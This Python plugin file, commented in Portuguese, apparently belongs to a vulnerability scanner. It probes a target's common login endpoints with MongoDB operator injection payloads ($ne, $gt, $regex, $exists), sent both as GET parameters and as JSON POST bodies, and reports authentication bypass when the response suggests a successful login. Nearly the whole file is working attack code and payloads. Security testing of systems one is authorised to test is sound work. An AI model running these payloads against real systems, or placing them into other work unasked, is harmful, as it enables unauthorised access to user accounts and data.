# plugins/nosql_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner NoSQL Injection (MongoDB, CouchDB).
    Testa injeção via operadores MongoDB em parâmetros GET e POST JSON.
    """
    import requests

    params = ["username", "user", "login", "email", "password", "pass", "id", "search", "q"]
    vulns = []

    # 1. GET parameter injection
    get_payloads = [
        ("[$ne]=", "NOSQL_NE_OPERATOR"),
        ("[$gt]=", "NOSQL_GT_OPERATOR"),
        ("[$regex]=.*", "NOSQL_REGEX"),
        ("[$exists]=true", "NOSQL_EXISTS"),
    ]

    login_endpoints = ["/login", "/api/login", "/api/v1/login", "/auth", "/api/auth"]

    for ep in login_endpoints:
        for param in params[:4]:
            for payload, method in get_payloads:
                url = f"http://{target}{ep}?{param}{payload}"
                try:
                    resp = requests.get(url, timeout=5)
                    if resp.status_code == 200 and any(kw in resp.text.lower() for kw in
                            ["token", "session", "welcome", "dashboard", "logged", "success"]):
                        vulns.append({
                            "tipo": "NOSQL_INJECTION",
                            "metodo": method,
                            "endpoint": ep,
                            "parametro": param,
                            "severidade": "CRITICO",
                            "descricao": f"Auth bypass via {method}",
                        })
                        break
                except Exception:
                    continue

    # 2. POST JSON injection
    json_payloads = [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": "admin", "password": {"$ne": "wrongpass"}},
    ]

    for ep in login_endpoints:
        for payload in json_payloads:
            try:
                resp = requests.post(f"http://{target}{ep}", json=payload, timeout=5,
                                     headers={"Content-Type": "application/json"})
                if resp.status_code == 200 and any(kw in resp.text.lower() for kw in
                        ["token", "session", "welcome", "dashboard", "success"]):
                    vulns.append({
                        "tipo": "NOSQL_INJECTION_JSON",
                        "endpoint": ep,
                        "payload": str(payload)[:100],
                        "severidade": "CRITICO",
                        "descricao": "Auth bypass via NoSQL operator injection",
                    })
                    break
            except Exception:
                continue

    return {"plugin": "nosql_scanner", "resultados": vulns if vulns else "Nenhum NoSQL injection detectado"}
